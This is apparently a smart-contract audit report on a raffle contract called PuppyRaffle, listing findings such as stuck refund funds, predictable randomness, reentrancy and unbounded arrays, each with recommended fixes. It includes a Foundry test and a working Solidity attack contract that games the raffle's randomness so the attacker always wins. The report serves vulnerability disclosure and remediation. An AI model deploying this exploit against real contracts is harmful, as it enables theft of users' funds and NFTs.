# Funds stuck if player is refunded

## Summary

If a player refunds, the value of their address in the array is changed to address(0) but the size of the array does not decrease.

## Vulnerability Details

The contract keeps track of the players who have entered the raffle with an array. When the refund is requested, the value is returned to the user, and their address in the array is set to address(0), however, the size of the array is not decreased.

When it's time to select a winner, the contract tries to calculate the payout by the size of the players array, multiplied by the entrance fee. If anyone's requested a refund, there's not going to be enough funds to payout compared to what the calculation is going to expect.

## Impact

Critical

## Tools Used

Foundry

## POC

```
function test_refundMakesFundsStuck() public playersEntered {
    vm.prank(playerOne);
    puppyRaffle.refund(0);

    vm.prank(playerTwo);
    puppyRaffle.refund(1);

    vm.prank(playerThree);
    puppyRaffle.refund(2);

    vm.prank(playerFour);
    puppyRaffle.refund(3);

    vm.warp(block.timestamp + duration + 1);

    vm.expectRevert("PuppyRaffle: Failed to send prize pool to winner");
    puppyRaffle.selectWinner();
}
```

## Recommendations

There are multiple ways to solve this problem. One would be to remove the item from the array altogether so that the size is equivalent to the number of players registered.

Alternatively, keep track of the balance in the raffle in a separate variable, and decrease or increase this variable after a player enters/leaves the raffle and use this to calculate the payout.

Also, it'd be better to use mappings to keep track of the users status rather than relying on arrays which can cause other problems such as the array growing too large for example.

# Randomness can be gamed

## Summary

The randomness to select a winner can be gamed and an attacker can be chosen as winner without random element.

## Vulnerability Details

Because all the variables to get a random winner on the contract are blockchain variables and are known, a malicious actor can use a smart contract to game the system and receive all funds and the NFT.

## Impact

Critical

## Tools Used

Foundry

## POC

```
// SPDX-License-Identifier: No-License

pragma solidity 0.7.6;

interface IPuppyRaffle {
    function enterRaffle(address[] memory newPlayers) external payable;

    function getPlayersLength() external view returns (uint256);

    function selectWinner() external;
}

contract Attack {
    IPuppyRaffle raffle;

    constructor(address puppy) {
        raffle = IPuppyRaffle(puppy);
    }

    function attackRandomness() public {
        uint256 playersLength = raffle.getPlayersLength();

        uint256 winnerIndex;
        uint256 toAdd = playersLength;
        while (true) {
            winnerIndex =
                uint256(
                    keccak256(
                        abi.encodePacked(
                            address(this),
                            block.timestamp,
                            block.difficulty
                        )
                    )
                ) %
                toAdd;

            if (winnerIndex == playersLength) break;
            ++toAdd;
        }
        uint256 toLoop = toAdd - playersLength;

        address[] memory playersToAdd = new address[](toLoop);
        playersToAdd[0] = address(this);

        for (uint256 i = 1; i < toLoop; ++i) {
            playersToAdd[i] = address(i + 100);
        }

        uint256 valueToSend = 1e18 * toLoop;
        raffle.enterRaffle{value: valueToSend}(playersToAdd);
        raffle.selectWinner();
    }

    receive() external payable {}

    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) public returns (bytes4) {
        return this.onERC721Received.selector;
    }
}
```

## Recommendations

Use Chainlink's VRF to generate a random number to select the winner. Patrick will be proud.

# Reentrancy via address.call()

## Summary

It's possible to reenter selectWinner() function when funds are sent, thus draining any of the fees stored.

## Vulnerability Details

If the caller of selectWinner() is a contract, it can be used to reenter the function. If there are any stored funds in the contract because the owner has not withdrawn their fees, these can be drained each time the user re-enters the contract.

## Impact

Medium

## Tools Used

Manual review

## Recommendations

Add a non-reentrant modifier to the function to ensure this behavior is not possible.

# Reentrancy via onERC721Received

## Summary

It's possible to reenter selectWinner() function when the NFT is minted, thus draining any of the fees stored and possibly minting more than one token.

## Vulnerability Details

If the caller of selectWinner() is a contract, it can be used to reenter the function. If the contract implements the `onERC721Received` function that `_safeMint()` is checking for, then it can re-enter the contract and if there are enough funds, it can get paid more and mint more than on token. Because it needs the contract to have enough funds and the admin not to withdraw, then this is not as likely to happen so marking as medium.

## Impact

Medium

## Tools Used

Manual review

## Recommendations

Add a non-reentrant modifier to the function to ensure this behavior is not possible.

# Unused function

## Summary

Unused function present in contract.

## Vulnerability Details

Informational, no vulnerability.

## Impact

Informational

## Tools Used

Manual review

## Recommendations

Remove unused function which adds to codesize

# Rarity can be predetermined

## Summary

The rarity of the NFT to be minted can be pre calculated by user.

## Vulnerability Details

A user can calculate and see if the rarity of the token will be convenient for them. Combined with the fact that the winner can be calculated beforehand, they could only participate to win and when the rarity is convenient.

## Impact

Low

## Tools Used

Foundry

## Recommendations

Used Chainlink's VRF to generate random number.

# getActivePlayer returns erroneous index

## Summary

getActivePlayer index returns 0 if address is not present, but index 0 is a valid index value for the first address to enter the raffle.

## Vulnerability Details

A user can be confused into thinking they are in the contest and continue to request a refund, spending gas, because of index 0.

## Impact

Low

## Tools Used

Manual review

## Recommendations

Revert if user is not found instead of returning a valid value.

# address(0) can be winner of raffle

## Summary

address(0) can be entered into the raffle, and if selected, funds and NFT will be lost.

## Vulnerability Details

Because `enterRaffle` does not check for address(0) being inputted as a player, there can be a scenario where it is selected as the winner and then funds are lost as well as the NFT.

## Impact

High

## Tools Used

Foundry

## Recommendations

Check that address(0) is not being sent as parat of the newPlayers array in `enterRaffle()`

# Players array can grow too large

## Summary

The players array can grow too large and thus become unusable.

## Vulnerability Details

If the players array grows too large, new users will be prevented from participating as their call will run out of gas when checking for duplicates. This means that a malicious user can fill the array with their addresses and there will be a very high likelihood that they will end up the winner. If chances are greater than 50% and the economics make sense, they can prevent others from entering and thus gaming the raffle each time.

## Impact

Medium

## Tools Used

Foundry

## Recommendations

Use mappings and uints to keep track of player status and participation rates.
